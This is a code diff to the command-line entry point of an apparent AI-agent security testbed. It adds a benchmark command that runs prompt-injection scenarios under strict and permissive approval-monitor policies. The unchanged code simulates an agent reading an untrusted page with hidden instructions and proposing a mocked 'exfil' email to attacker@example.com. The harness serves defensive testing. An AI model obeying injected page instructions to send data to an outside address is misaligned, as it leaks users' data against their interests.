@@ -7,6 +7,7 @@ from typing import Optional
 
 from rich import print
 
+from aegis.bench import bench
 from aegis.core.run import new_run
 from aegis.defenses.approval_monitor import ApprovalMonitor, Policy
 from aegis.eval.metrics import evaluate_run
@@ -47,6 +48,12 @@ def main() -> None:
     ev.add_argument("--out", default="runs", help="Runs root folder")
     ev.add_argument("--latest", action="store_true", help="Evaluate the latest run in runs/")
 
+    # --- bench ---
+    b = sub.add_parser("bench", help="Run multiple scenarios/policies and write a summary")
+    b.add_argument("--out", default="runs", help="Runs root folder")
+    b.add_argument("--scenarios", nargs="+", default=["indirect_injection_01"], help="Scenario names (no extension)")
+    b.add_argument("--policies", nargs="+", default=["strict", "permissive"], help="Policies to run")
+
     args = parser.parse_args()
 
     # =========================
@@ -72,7 +79,6 @@ def main() -> None:
 
         ctx.trace.event("agent_start", mode="demo_no_llm")
 
-        # Policy selection
         policy = Policy.permissive() if args.policy == "permissive" else Policy.default()
         monitor = ApprovalMonitor(policy=policy)
 
@@ -104,7 +110,6 @@ def main() -> None:
             search_tool = SearchLocalPageTool()
             email_tool = SendEmailTool()
 
-            # Retrieve untrusted content (local HTML)
             proposed_search = search_tool.propose(page="evil_page.html")
             ctx.trace.event("tool_proposed", tool_name=proposed_search.name, args=proposed_search.args)
 
@@ -115,14 +120,12 @@ def main() -> None:
                 result_meta={"page": search_result["page"]},
             )
 
-            # Mark as untrusted content
             ctx.trace.event(
                 "untrusted_content_received",
                 source="search_local_page",
                 note="HTML may contain hidden instructions",
             )
 
-            # Simulate agent being influenced -> tries tool misuse
             proposed_email = email_tool.propose(
                 to="attacker@example.com",
                 subject="exfil",
@@ -180,10 +183,32 @@ def main() -> None:
         print("[bold]Email executed (mocked):[/bold]", m["email_executed_mocked"])
         return
 
+    # =========================
+    # BENCH
+    # =========================
+    if args.cmd == "bench":
+        res = bench(out_root=args.out, scenarios=args.scenarios, policies=args.policies)
+        summary_path = res["summary_path"]
+        payload = res["payload"]
+
+        print("[bold green]AEGIS BENCH[/bold green] ✅")
+        print(f"Summary: [cyan]{Path(summary_path).resolve()}[/cyan]\n")
+
+        # Small readable summary
+        for r in payload["results"]:
+            print(
+                f"- scenario=[cyan]{r['scenario']}[/cyan] "
+                f"policy=[cyan]{r['policy']}[/cyan] "
+                f"email_executed=[bold]{r['email_executed_mocked']}[/bold] "
+                f"blocked={r['blocked']}"
+            )
+        return
+
     raise SystemExit("Unknown command")
 
 
 if __name__ == "__main__":
     main()
+
 
 
